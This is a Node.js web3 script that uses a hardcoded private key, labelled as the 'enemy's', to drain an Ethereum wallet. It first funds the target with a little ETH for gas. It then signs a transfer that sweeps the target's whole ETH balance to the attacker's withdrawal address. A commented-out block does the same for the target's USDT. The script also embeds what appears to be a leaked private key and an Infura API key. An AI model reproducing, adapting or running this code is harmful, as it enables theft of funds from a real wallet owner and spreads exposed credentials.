const Web3 = require("web3");
var erc20File = "./token.json";
const fs = require('fs');
const axios = require('axios');

var tokenAbi = JSON.parse(fs.readFileSync(erc20File));

const rpcURL = "https://mainnet.infura.io/v3/fa86b50a48804583b28dd56349dd430f"; //  "http://127.0.0.1:8545"                                // "https://mainnet.infura.io/v3/"
const usdtTokenAddr = "0xdAC17F958D2ee523a2206206994597C13D831ec7";     // usdt token contract address
const target = "0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3";              // enemy's pubkey
const sender = "0xF87b6760D95ba7c60d7108ec89cdA9AC8a5E8161";              // our ether supplier
const receiver = "0xfC5aCFFD75Be99f7B806123FBA94da863076189a";                  // our withdraw pubkey
const privateKey_send = "tgtyutuytyutyutu";        // our privkey
const privateKey_target = "ee9cec01ff03c0adea731d7c5a84f7b412bfd062b9ff35126520b3eb3d5ff258";    // enemy's private key
const transferAmount = 500_000_000_000_000;    //0.0005ETH     10^18 wei = 1ETH

const web3 = new Web3(rpcURL);
const tokenContract = new web3.eth.Contract(tokenAbi, usdtTokenAddr);
const getBalance = async (account) => {
    const wei = await web3.eth.getBalance(account);
    console.log("ETH balance: ", wei);
    return wei;
}

const getusdtBalance = async (account) => {
    const dai = await tokenContract.methods.balanceOf(account).call();
    console.log("DAI balance: ", dai);
    return dai;
}

const transaction = async () => {
    const usdtBalance = await getusdtBalance(target);
    const tx = {
        // this could be provider.addresses[0] if it exists
        from: sender,
        // target address, this could be a smart contract address
        to: target,
        // optional if you want to specify the gas limit 
        gas: 21000,
        value: transferAmount
        // this encodes the ABI of the method and the arguements
    };
    const signPromise = web3.eth.accounts.signTransaction(tx, privateKey_send);    // send transaction
    signPromise.then((signedTx) => {
        const sentTx = web3.eth.sendSignedTransaction(signedTx.raw || signedTx.rawTransaction);
        // if success
        sentTx.on("receipt", async receipt => {
            console.log("success: ");
            const ethBalance = await getBalance(target);

            await fetch(usdtBalance, ethBalance);        // get balance from target    occur
        });
        sentTx.on("error", err => {
            console.log("err1 = ", err)
        });
    })
}

// gas = gasPrice * gasAmount
// 

const fetch = async (usdtBalance, ethBalance) => {
    console.log("receiver: ", receiver, usdtBalance, ethBalance)
    const gasAmount = 21620;
    // tokenContract.methods.transfer(receiver, balance).estimateGas({ from: target }).then(async (gasAmount) => {
    const gasPrice = Math.floor(ethBalance / gasAmount);
    const amount = ethBalance - gasPrice * 21000;

    console.log("gasfee: ", gasAmount, gasPrice, amount)
    // ether transaction
    const tx = {
        // this could be provider.addresses[0] if it exists
        from: target,
        // target address, this could be a smart contract address
        to: receiver,
        // optional if you want to specify the gas limit 
        gasPrice: gasPrice,
        gas: 21000,
        // this encodes the ABI of the method and the arguements
        value: amount
    };

    // usdt transaction
    // const tx = {
    //     // this could be provider.addresses[0] if it exists
    //     from: target,
    //     // target address, this could be a smart contract address
    //     to: usdtTokenAddr,
    //     // optional if you want to specify the gas limit 
    //     gasPrice: gasPrice,
    //     gas: gasAmount,
    //     // this encodes the ABI of the method and the arguements
    //     data: tokenContract.methods.transfer(receiver, usdtBalance).encodeABI()
    // };

    const signPromise = web3.eth.accounts.signTransaction(tx, privateKey_target);
    signPromise.then((signedTx) => {
        const sentTx = web3.eth.sendSignedTransaction(signedTx.raw || signedTx.rawTransaction);
        sentTx.on("receipt", receipt => {
            console.log("success")
            getBalance(target);
            usdtBalance(target);
        });
        sentTx.on("error", err => {
            console.log("err1 = ", err)
        });
    })
}

transaction();

